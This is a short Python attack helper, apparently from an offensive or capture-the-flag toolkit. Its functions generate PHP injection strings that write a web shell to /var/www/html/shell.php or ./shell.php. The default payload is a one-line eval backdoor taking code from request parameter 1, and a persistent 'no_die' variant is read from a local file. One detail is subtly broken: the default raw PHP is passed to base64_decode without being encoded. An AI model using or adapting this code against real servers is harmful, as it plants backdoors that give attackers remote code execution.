#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64

rsa_no_die_shell = ""
with open("./shells/no_die_shell.php", "r") as f:
    rsa_no_die_shell = f.read().replace("\n", "")


def exp_upload_shell(path="/var/www/html/shell.php", data=""):
    """file_put_contents('%s',base64_decode('%s'));<br/>
    default shell : <?php @eval($_REQUEST[1]);
    """
    if not data:
        data = "<?php @eval($_REQUEST[1]);"
    return """file_put_contents('%s',base64_decode('%s'));
    """ % (path, data)


def exp_upload_shell_rsa(path="/var/www/html/shell.php"):
    """Default<br/>
    path="/var/www/html/shell.php"<br/>data=[rsa_no_die_shell]
    """
    return exp_upload_shell(path, rsa_no_die_shell)


def exp_upload_shell_rsa_abs():
    """Default path="/var/www/html/shell.php"
    """
    return exp_upload_shell_rsa("/var/www/html/shell.php")


def exp_upload_shell_rsa_rel():
    """Default path="./shell.php"
    """
    return exp_upload_shell_rsa("./shell.php")
